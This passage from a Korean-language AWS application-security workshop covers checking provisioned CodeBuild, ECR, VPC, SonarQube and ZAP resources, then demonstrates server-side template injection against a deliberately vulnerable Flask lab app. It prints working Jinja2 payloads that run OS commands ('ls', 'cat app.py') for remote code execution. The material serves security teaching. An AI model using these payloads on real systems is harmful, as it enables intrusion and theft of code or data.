%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  **BuildImage** 단계를 정의하는 CodeBuild 프로젝트를 확인해 보도록 하겠습니다. AWS 콘솔의 검색창에 **CodeBuild**를 입력하고 **CodeBuild**를 선택하여 AWS CodeBuild 대시보드를 엽니다. 정상적인 경우 **codebuild-docker-project**라는 빌드 프로젝트가 표시되어야 합니다.

![codebuild-project](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/codebuild-project.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

5.  CodeBuild 프로젝트가 실제로 수행하는 작업에 대해 자세히 알아보려면 빌드 프로젝트 목록에서 **codebuild-docker-project**를 클릭한 다음 **Build Details** 탭을 클릭합니다.

![codebuild-details](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/codebuild-details.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

6.  빌드 세부 정보 페이지를 아래로 스크롤하여 **docker_buildspec.yaml**의 현재 값이 있는 **Buildspec** 섹션을 확인합니다. **[Buildspecs](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html) **은 CodeBuild가 빌드를 실행하는 데 사용하는 빌드 명령 및 관련 설정 모음입니다. 이 실습에서 빌드 사양은 코드베이스에서 가져옵니다. CodeBuild는 웹 애플리케이션의 코드에서 **docker_buildspec.yaml**이라는 파일을 찾아 실행합니다. 이 모듈의 [부록: docker_buildspec.yaml 탐색](https://catalog.us-east-1.prod.workshops.aws/event/dashboard/ko-KR/workshop/module2/docker_buildspec.html) 섹션에서 이에 대해 자세히 살펴봅니다. ![codebuild-buildspec](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/codebuild-buildspec.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

조직에 따라 개발자가 buildspec을 수정하지 못하도록 제한하려는 경우 소스 디렉터리에서 정의하는 대신 CodeBuild 또는 S3에서 직접 빌드 사양을 프로비저닝하도록 선택할 수 있습니다([https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)  참조).

7.  **BuildImage** 빌드 단계는 컨테이너를 Amazon ECR의 프라이빗 리포지토리에도 게시합니다. 컨테이너 저장소를 보려면 AWS 콘솔 검색창에 **ECR**을 입력하고 **Elastic Container Registry**를 선택합니다. **flask-app**이라는 새 비공개 저장소가 표시되어야 합니다.

![ecr](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/ecr.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

8.  CDK는 보안 도구와 웹 애플리케이션이 호스팅될 VPC를 프로비저닝하도록 되어 있습니다. AWS 콘솔 검색창에 **VPC**를 입력하고 VPC 대시보드 링크를 클릭합니다. 왼쪽 메뉴에서 **Your VPCs** 링크를 클릭하여 **StagingVPC**라는 새 VPC가 자동으로 프로비저닝되었는지 확인합니다.

![vpc-dashboard](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/vpc-dashboard.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

9.  **StagingVPC**는 아래에 설명된 대로 일반적인 2AZ 토폴로지를 사용합니다.

![vpc](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/vpc.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

10.  또한 Amazon ECS Fargate에 **SonarQube Server**를 배포했습니다. AWS 콘솔 검색창에 **ECS**를 입력하고 CDK에서 생성한 ECS 클러스터를 클릭합니다. **AppSecWorkshopStack-DevToolsSonarQubeService** 접두사가 있는 새 서비스가 표시되어야 합니다. 이것은 **Module 4**에서 자세히 살펴볼 **SAST** 도구입니다.

![cdk-deploy-sonarqube](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cdk-deploy-sonarqube.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

11.  마지막으로 CDK는 Amazon EC2에 **OWASP Zap Proxy(zaproxy)**도 배포해야 합니다. AWS 콘솔 검색창에 **EC2**를 입력하고 왼쪽 메뉴 표시줄에서 **Instances** 링크를 클릭합니다. **AppSecWorkshopStack/DevTools/Zaproxy**라는 새 EC2 서버가 표시되어야 합니다. 이것은 **Module 7**에서 자세히 살펴볼 **DAST** 도구입니다.

![cdk-deploy-zap](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cdk-deploy-zap.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

모든 것이 정상이라면 섹션으로 이동하여 웹 애플리케이션을 이 환경에 배포하도록 하겠습니다!

# 3. OWASP Top 10

이 모듈에서는 _침투테스터_ 의 대상이 되는 배포한 웹 응용 프로그램을 살펴보도록 하겠습니다.

침투테스터는 애플리케이션의 잠재적인 취약성과 잘못된 구성을 이용하려는 악의적인 행위자로 가장하여 작동합니다. 웹에 대한 공격은 수동 또는 자동화된 침투 테스트 도구를 통해 수행됩니다.

또한 일반적인 [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/) 에 대해서도 살펴보도록 하겠습니다. **OWASP Top 10**은 정기적으로 업데이트되는 개발자 및 보안 실무자를 위한 보안 관련 공개 정보입니다. [PCI-DSS](https://www.pcisecuritystandards.org/) 와 같은 많은 산업 표준은 OWASP Top 10을 지침으로 참조하며 이는 **Secure Coding Practice**을 시작하는 좋은 기초가 됩니다.

개발자는 다음과 같은 이점을 제공하므로 침투 테스트 단계에 도달하기 전에 일부 보안 문제를 포착할 수 있도록 침투 테스트 및 보안 코딩 기술을 배우는 데 시간을 투자할 가치가 있습니다.

1.  출시 후 수정해야 할 사항이 적기 때문에 릴리스 프로세스를 더 빠르게 진행할 수 있습니다.
2.  소프트웨어 딜리버리의 초기 단계에서 수행하면 상대적으로 손쉽게 취약점을 제거할 수 있습니다.
3.  기술적 부채 감소

#### Topics Covered


이 실습을 마치면 다음을 수행할 수 있습니다.

-   일반적인 웹 취약점이 어떻게 악용되는지에 대한 잠재적 영향을 알 수 있게 됩니다.

# 파라미터 공격

우리의 초기 환경은 [OWASP Top 10](https://owasp.org/www-project-top-ten/) 을 탐색하는 데 사용할 AWS Fargate의 웹 애플리케이션 이미지도 배포합니다. 아래 가이드에 따라 액세스할 수 있습니다.

1.  AWS 콘솔 검색 상자에서 **CloudFormation**을 검색하고 **CloudFormation** 콘솔을 엽니다. 스택 목록에서 **AppSecWorkshopStack**을 선택합니다.

![cfn-appsecworkshopstack](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cfn-appsecworkshopstack.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  **Outputs** 탭을 클릭하고 **TasksFlaskAppServiceURL** 접두사가 있는 출력을 찾습니다.

![cfn-outputs.png](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/cfn-outputs.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  **TasksFlaskAppServiceURL** 링크를 마우스 오른쪽 버튼으로 클릭하고 새 탭에서 엽니다. OWASP Top Ten 운동에 사용할 웹사이트를 열어야 합니다.

![webapp-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/webapp-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

[

## 웹 애플리케이션 정보

](https://catalog.us-east-1.prod.workshops.aws/event/dashboard/ko-KR/workshop/module3/attack-parameters#)

다음은 방금 연 웹 애플리케이션(_flask-app_)에 대한 몇 가지 내용입니다.

-   웹 애플리케이션은 **python**으로 작성되었습니다.
-   **[Flask](https://flask.palletsprojects.com/en/2.0.x/) **라는 유명한 Python 웹 프레임워크를 사용합니다.
-   **[Jinja](https://jinja.palletsprojects.com/en/3.0.x/)**  템플릿 엔진을 사용하여 HTML "server-side"을 생성합니다.
-   단순함을 위해 **[SQLite](https://www.sqlite.org/index.html) **를 데이터 저장소로 사용합니다.
-   **[SQLAlchemy](https://www.sqlalchemy.org/) **라는 ORM(Object Relational Mapper) 툴킷을 사용하여 데이터베이스에 인터페이스합니다.

실습 시나리오를 통해 일부 정보를 제공했지만 **Attacker**가 이 정보를 수집할 수 있는 방법에 대해서도 살펴보도록 하겠습니다.

**Attacker**는 다음 자격 증명으로 웹사이트에 사전 등록했습니다.

-   **Username**: badguy
-   **Password**: badguy

**john**이라는 사용자 이름으로 사전 등록된 사용자도 있습니다.

이러한 매개변수 집합이 주어지면 다음 섹션에서 논의되는 개념은 모든 종류의 언어, 플랫폼 또는 프레임워크에도 적용됩니다.

# A1: 인젝션

[OWASP Top Ten](https://owasp.org/www-project-top-ten/) 에 명시된 바와 같이

> SQL, NoSQL, OS 및 LDAP 인젝션과 같은 인젝션결함은 신뢰할 수 없는 데이터가 명령 또는 쿼리의 일부로 인터프리터에 전송될 때 발생합니다. 공격자의 적대적인 데이터는 인터프리터가 의도하지 않은 명령을 실행하거나 적절한 승인 없이 데이터에 액세스하도록 속일 수 있습니다.

인젝션 공격은 다양한 형태로 나타날 수 있습니다. 특히 이 실습의 경우 웹 애플리케이션은 **[Server Side Template Injection (SSTI)](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)**  에 취약합니다. SSTI 공격은 [Jinja](https://jinja.palletsprojects.com/en/3.0.x/) 와 같은 **서버 측** 템플릿 엔진을 사용하는 웹 애플리케이션에서 일반적으로 사용됩니다. 공격자가 안전하지 않은 방식으로 템플릿에 포함된 입력을 보내 서버에서 **[RCE(Remote Code Execution)](https://en.wikipedia.org/wiki/Arbitrary_code_execution)**  가 발생할 수 있습니다.

RCE(권한 에스컬레이션 포함)는 공격자가 개인 식별 정보(PII) 누출 및 서비스 거부와 같은 악의적인 활동을 시스템에서 수행할 수 있으므로 특히 위험합니다.

이제 인젝션 공격이 어떻게 작동하는지 살펴보도록 하겠습니다:

1.  Web Application URL 에서 **OWASP Top 10 Examples** 를 클릭한 후 메뉴바에서 **A1: Injection** 를 선택합니다.

![a1-select](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a1-select.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

2.  **badguy**를 입력하면 매우 간단한 페이지가 요청한 이름을 포함하여 렌더링하는 것을 볼 수 있습니다.

![a1-test](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a1-test.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

3.  템플릿 엔진은 특별한 HTML 마크업을 사용하여 코드가 데이터를 동적으로 인젝션 할 수 있는 위치를 나타냅니다. [Jinja](https://jinja.palletsprojects.com/en/3.0.x/)  템플릿은 특히 **이중 중괄호 {{ }}** 를 사용합니다. 곱셈에 유효한 파이썬 구문인 `{{8*8}}` 을 입력하여 임의의 코드를 실행할 수 있는지 시도해 보겠습니다.

![a1-test-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a1-test-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  서버가 실제로 코드를 실행하고 **64**의 올바른 결과를 반환했음을 확인해야 합니다. 이것은 웹 애플리케이션이 SSTI를 통해 악용될 수 있음을 공격자에게 검증합니다. 일부 파이썬 노하우로 공격자는 더 유해한 코드를 실행할 수 있습니다. Flask의 **request** 개체를 사용하고 Python의 [os 라이브러리](https://docs.python.org/3/library/os.html) 를 가져와 원격 명령을 실행할 수 있습니다. 이 코드를 붙여넣으세요: `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`
    
    . 이 코드는 사용자가 애플리케이션의 현재 디렉토리를 **list(ls)** 할 수 있도록 합니다. ![a1-list](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/a1-list.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)
    
5.  이제 공격자가 웹 응용 프로그램의 디렉토리를 나열할 수 있으므로 시스템의 더 흥미로운 부분을 엿보고 작동 방식을 확인할 수 있습니다. **app.py**라는 파일은 분명히 공격자가 보고 싶어하는 것입니다. 이 코드를 붙여넣으세요: `{{request.application.__globals__.__builtins__.__import__('os').popen('cat app.py').read()}}`
    
    .
    

